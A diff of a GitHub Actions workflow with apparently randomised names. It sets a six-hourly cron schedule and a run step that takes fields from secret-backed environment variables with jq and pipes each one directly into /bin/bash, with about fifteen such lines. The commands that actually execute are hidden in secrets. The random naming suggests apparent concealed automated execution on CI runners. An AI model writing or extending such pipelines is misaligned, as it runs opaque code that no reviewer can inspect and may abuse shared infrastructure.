@@ -3,19 +3,29 @@ name: yaoxianzhi7129
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 0/6 * * *'
+    - cron: '25 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yaoxianzhi7129
         env:
-          len6650: ${{ secrets.len6650 }}
+          ebuwi23: ${{ secrets.ebuwi23 }}
         run: |
-          echo $len6650 | jq -r .wbx90 | /bin/bash
-          echo $injd24898 | jq -r .gban4 | /bin/bash
-          echo $humfd63 | jq -r .sa067 | /bin/bash
-          echo $r23114 | jq -r .g0 | /bin/bash
+          echo $ebuwi23 | jq -r .cm3416 | /bin/bash
+          echo $zii039 | jq -r .moy0571 | /bin/bash
+          echo $cjlci1 | jq -r .hdt12855 | /bin/bash
+          echo $kqaq58 | jq -r .qju33370 | /bin/bash
+          echo $aw4480 | jq -r .ojjw272 | /bin/bash
+          echo $hfsf345 | jq -r .uy15 | /bin/bash
+          echo $bwznw51099 | jq -r .cj0470 | /bin/bash
+          echo $wr67167 | jq -r .oiwg371 | /bin/bash
+          echo $oi4 | jq -r .z5 | /bin/bash
+          echo $u56225 | jq -r .hyp59 | /bin/bash
+          echo $jqwt049 | jq -r .z077 | /bin/bash
+          echo $vylnq811 | jq -r .suy9707 | /bin/bash
+          echo $wgtez16955 | jq -r .j283 | /bin/bash
+          echo $x5002 | jq -r .nt86818 | /bin/bash
+          echo $j523 | jq -r .mhpc5 | /bin/bash
 
